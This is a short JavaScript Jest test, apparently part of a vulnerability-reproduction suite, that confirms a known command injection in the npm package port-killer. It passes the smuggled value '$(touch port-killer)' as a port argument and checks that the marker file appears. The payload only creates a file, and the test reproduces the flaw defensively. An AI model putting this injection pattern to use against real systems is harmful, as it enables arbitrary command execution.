//https://snyk.io/vuln/SNYK-JS-PORTKILLER-1078533
test("Command Injection in port-killer", () => {
  const port_killer = require("port-killer");
  const fs = require("fs");
  const path = "./port-killer";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  port_killer("$(touch port-killer)");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
